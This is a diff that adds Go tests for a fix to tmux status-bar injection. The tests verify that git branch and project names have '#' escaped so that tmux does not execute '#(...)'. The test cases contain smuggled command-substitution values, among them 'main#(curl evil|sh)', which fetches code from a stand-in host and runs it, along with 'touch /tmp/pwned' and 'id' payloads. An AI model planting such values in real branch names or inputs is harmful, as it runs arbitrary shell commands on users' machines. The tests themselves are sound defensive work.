@@ -753,3 +753,68 @@ func TestIsSecretEnvKey(t *testing.T) {
 		}
 	}
 }
+
+// TestSanitizeTmuxStatusValue verifies the #3289 remediation: externally-sourced
+// values interpolated into a tmux status format have their '#' escaped to '##'
+// (so tmux never executes "#(...)" or expands "#{...}"/"#[...]"), control chars
+// dropped, and length clamped.
+func TestSanitizeTmuxStatusValue(t *testing.T) {
+	cases := []struct{ name, in, want string }{
+		{"command-sub", "main#(curl evil|sh)", "main##(curl evil|sh)"},
+		{"format-expand", "a#{x}b", "a##{x}b"},
+		{"style", "c#[fg]d", "c##[fg]d"},
+		{"plain", "feature/foo", "feature/foo"},
+		{"hash-literal", "feat#123", "feat##123"},
+		{"control-chars", "a\nb\x1bc\x7fd", "abcd"},
+	}
+	for _, tc := range cases {
+		if got := sanitizeTmuxStatusValue(tc.in); got != tc.want {
+			t.Errorf("%s: sanitizeTmuxStatusValue(%q)=%q, want %q", tc.name, tc.in, got, tc.want)
+		}
+	}
+	// No live "#(" command-substitution survives (escaped "##" collapses to a literal '#').
+	if got := sanitizeTmuxStatusValue("x#(touch /tmp/pwned)"); strings.Contains(strings.ReplaceAll(got, "##", ""), "#(") {
+		t.Errorf("sanitized value still has a live #(: %q", got)
+	}
+	// Length is clamped (defence against an over-long branch flooding the status line).
+	if got := sanitizeTmuxStatusValue(strings.Repeat("x", 100)); len(got) != 64 {
+		t.Errorf("clamp: got len %d, want 64", len(got))
+	}
+}
+
+// TestConfigureStatusBar_EscapesInjection proves the fix end-to-end: a git branch
+// / project name carrying a "#(shell-command)" lands in the tmux status-left /
+// status-right with no live "#(" that tmux would execute. Skipped when tmux is
+// absent.
+func TestConfigureStatusBar_EscapesInjection(t *testing.T) {
+	if _, err := exec.LookPath("tmux"); err != nil {
+		t.Skip("tmux not installed")
+	}
+	tm := NewTmuxManager("vftest-statusinj")
+	_, _ = tm.run("kill-server")
+	defer func() { _, _ = tm.run("kill-server") }()
+	if err := tm.EnsureServer(); err != nil {
+		t.Skipf("cannot start tmux server: %v", err)
+	}
+	if _, err := tm.run("new-session", "-d", "-s", "vibeflow_inj"); err != nil {
+		t.Skipf("cannot create tmux session: %v", err)
+	}
+	if err := tm.ConfigureStatusBar("vibeflow_inj", StatusBarOpts{
+		Provider: "claude",
+		Branch:   "main#(touch /tmp/vf_should_not_exist)",
+		Project:  "proj#(id)",
+	}); err != nil {
+		t.Fatalf("ConfigureStatusBar: %v", err)
+	}
+	for _, opt := range []string{"status-left", "status-right"} {
+		out, err := tm.run("show-options", "-t", "vibeflow_inj", opt)
+		if err != nil {
+			t.Fatalf("show-options %s: %v", opt, err)
+		}
+		// After collapsing the escaped "##", no live "#(" may remain (tmux would
+		// otherwise run it as a shell command on every status refresh).
+		if strings.Contains(strings.ReplaceAll(out, "##", ""), "#(") {
+			t.Errorf("%s has a live #( command-substitution: %q", opt, out)
+		}
+	}
+}
